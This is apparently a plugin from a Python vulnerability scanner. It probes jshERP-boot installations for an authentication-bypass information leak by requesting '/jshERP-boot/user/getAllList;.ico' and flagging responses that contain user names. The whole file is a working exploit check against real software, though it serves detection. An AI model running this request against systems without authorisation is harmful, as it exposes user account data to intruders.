#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings()


class JshErpBootScan:

    def run(self, urls):
        try:
            url = urls + '/jshERP-boot/user/getAllList;.ico'
            response = requests.get(url,headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if response.status_code == 200 and "username" in response.text:
                OutPrintInfo("JshErpBoot", '[b bright_red]存在敏感信息泄漏 ')
                OutPrintInfo("JshErpBoot", f"{url}")
            else:
                OutPrintInfo("JshErpBoot", '不存在敏感信息泄漏')
                pass
        except Exception:
            pass
    def main(self, target):
        OutPrintInfo("JshErpBoot", '开始检测敏感信息泄漏...')
        url = target[0].strip('/ ')
        self.ssl = target[1]
        header = target[2]
        proxy = target[3]
        self.timeout = int(target[4])
        req = ReqSet(header=header,proxy=proxy)
        self.headers = req["header"]
        self.proxy = req["proxy"]

        self.run(url)

        OutPrintInfo("JshErpBoot", '存在敏感信息泄漏检测结束')